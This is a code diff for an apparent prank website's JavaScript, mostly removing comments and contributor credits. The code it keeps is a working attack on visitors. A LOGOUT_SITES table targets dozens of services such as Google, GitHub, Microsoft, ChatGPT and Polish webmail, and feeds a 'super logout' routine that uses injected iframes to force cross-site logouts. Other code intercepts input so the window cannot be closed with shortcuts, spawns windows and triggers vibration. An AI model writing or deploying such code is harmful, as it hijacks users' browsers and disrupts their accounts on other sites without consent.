@@ -56,9 +56,9 @@ const VIDEOS = [
   'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
   'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
   'media/videos/intro.mp4',
-  'media/videos/szybkakaczka.mp4', // added by @dan64iel
-  'media/videos/kaczuszka.mp4', //added by @imzeme
-  'media/videos/gratulacje.mp4' //added by @GameShoot8050
+  'media/videos/szybkakaczka.mp4', 
+  'media/videos/kaczuszka.mp4', 
+  'media/videos/gratulacje.mp4'
 ]
 
 const FILE_DOWNLOADS = [
@@ -70,10 +70,10 @@ const FILE_DOWNLOADS = [
   'media/images/ptakwspodniach.jpg',
   'media/images/kichajacyptoszek.jpg',
   'media/images/lubieptoszki.png',
-  'media/images/zimowyptoszek.jpeg', // added by @dan64iel
-  'media/images/zlyptok.jpeg', //added by @imzeme
-  'media/images/grubyptok.jpg', //added by @imzeme
-  'media/images/ptokzjajami.jpeg' //added by @MARECKIyt
+  'media/images/zimowyptoszek.jpeg',
+  'media/images/zlyptok.jpeg', 
+  'media/images/grubyptok.jpg',
+  'media/images/ptokzjajami.jpeg' 
 ]
 
 const PHRASES = [
@@ -95,7 +95,7 @@ const LOGOUT_SITES = {
   eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
   GitHub: ['GET', 'https://github.com/logout'],
   GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], 
   Hulu: ['GET', 'https://secure.hulu.com/logout'],
   NetFlix: ['GET', 'https://www.netflix.com/Logout'],
   Skype: ['GET', 'https://secure.skype.com/account/logout'],
@@ -108,92 +108,67 @@ const LOGOUT_SITES = {
   Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
   JShop: ['GET', 'https://jshop.partners/panel/logout'],
-  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
-  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
-  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
-  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
-  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
-  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
-  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
-  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
-  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
-  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
-  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
-  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
-  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
-  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
-  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
-  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
-  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
-  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
-  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt
+  Vimeo: ['GET', 'https://vimeo.com/log_out'],
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'], 
+  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], 
+  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], 
+  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], 
+  OLX: ['GET', 'https://www.olx.pl/account/logout'], 
+  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
+  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], 
+  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], 
+  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
+  Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
+  Reddit: ['GET', 'https://www.reddit.com/logout'], 
+  Spotify: ['GET', 'https://www.spotify.com/logout/'], 
+  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], 
+  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], 
+  Trello: ['GET', 'https://trello.com/logout'], 
+  Baidu: ['GET', 'https://passport.baidu.com/?logout'], 
+  VK: ['GET', 'https://vk.com/exit'], 
+  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] 
 }
 
-/**
- * Array to store the child windows spawned by this window.
- */
+
 const wins = []
 
-/**
- * Count of number of clicks  - added by @9fm
- */
 
 let interactionCount = 0
 
-//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
 
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) 
+
+
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
+
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
+
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
+
 
 init()
 
-/*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
- */
+
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
+
 function init () {
   confirmPageUnload()
 
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
+
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
+
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
